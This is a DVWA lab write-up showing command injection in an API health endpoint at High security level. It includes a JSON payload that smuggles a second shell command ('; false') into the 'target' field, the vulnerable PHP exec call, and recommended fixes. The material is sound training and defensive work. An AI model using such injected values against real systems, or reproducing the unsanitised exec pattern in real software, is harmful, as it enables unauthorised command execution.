# API Security - High

## Steps

### 1. Open the API Security Module

* Set DVWA Security Level to **High**.
* Navigate to **API Security**.

**Screenshot:** `01_target_page.JPG`

---

### 2. Identify the Vulnerable Endpoint

* Review the OpenAPI specification.
* Locate the health endpoint:

```text
/v2/health/connectivity
```

* The endpoint accepts a user-controlled `target` parameter.

---

### 3. Exploit Command Injection

* Send a POST request:

```json
{
  "target":"127.0.0.1; false"
}
```

* The application executes:

```bash
ping -c 4 127.0.0.1; false
```

* The injected command modifies the return status of the executed command.

**Screenshot:** `02_command_injection.JPG`

---

## Result

The API returned:

```json
{
  "status":"Connection failed"
}
```

The response changed from:

```json
{
  "status":"OK"
}
```

to:

```json
{
  "status":"Connection failed"
}
```

after injecting an additional command into the `target` parameter, confirming command injection.

---

## Reason

The application passes user input directly into an operating system command:

```php
exec("ping -c 4 " . $target, $output, $ret_var);
```

Because the `target` parameter is not validated or sanitized, an attacker can inject additional shell commands.

---

## Fix

* Avoid executing shell commands with user-controlled input.
* Use secure APIs instead of system command execution.
* Validate and whitelist allowed hostnames/IP addresses.
* Escape shell arguments where command execution is required.
* Apply the principle of least privilege to the web service account.
